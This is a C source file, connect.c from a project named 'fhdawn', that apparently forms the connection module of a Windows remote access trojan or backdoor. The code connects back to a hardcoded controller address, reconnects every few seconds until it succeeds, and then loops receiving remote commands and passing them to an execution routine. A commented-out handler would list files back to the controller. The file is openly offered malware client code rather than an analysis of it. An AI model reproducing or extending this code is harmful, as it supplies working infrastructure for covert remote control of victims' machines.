/*
Author: Fahad (QuantumCore)
connect.c (c) 2020
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include "fhdawn.h"

// By @augustgl
int sockprintf(SOCKET sock, const char* words, ...) {
    static char textBuffer[BUFFER];
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    return send(sock, textBuffer, strlen(textBuffer), 0); // see, it's printf but for a socket. instead of printing, at the end it's a send()
}

void REConnect(void)
{
    closesocket(sockfd);
    WSACleanup();
    Sleep(5000);
    MainConnect();
}

void sockSend(const char* data)
{
    int lerror = WSAGetLastError();
	int totalsent = 0;
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = false;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

void fhdawn_main(void)
{
    while(connected)
    {
        memset(recvbuf, '\0', BUFFER);
        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
        if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = FALSE;
        }

        // if(strcmp(recvbuf, "ls") == 0)
        // {
        //     WIN32_FIND_DATA data;
        //     HANDLE hFind = FindFirstFile("*", &data);
        //     char list[BUFFER] = {0}; memset(list, '\0', BUFFER);
        //     if(hFind != INVALID_HANDLE_VALUE){
        //         do{
        //             if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
        //                 list += data.
        //             } else {
        //                 snprintf(list, BUFFER, "[FILE] %s\n", data.cFileName);
        //             }
        //         } while(FindNextFile(hFind, &data));

        //     } else {
        //         sockprintf(sockfd, "[Error] Failed to get files in Directory, Error : %ld\n", GetLastError());
        //     }

        //     send(sockfd, list, BUFFER, 0);
        ExecSock();
    }    
}

void StartWSA(void)
{
    WSADATA wsa;
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        printf("[Error] Error Starting Winsock.");
        WSAReportError();
    }
}


void MainConnect(void)
{
    StartWSA();
    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, 0);
    if(sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
    {
        printf("Socket Creation Error. ");
        WSAReportError();
        exit(1);
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(421);
    server.sin_family = AF_INET;

    do {
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            REConnect();
        }
        else {
            connected = TRUE;
        }
    } while (!connected); 

    fhdawn_main();
}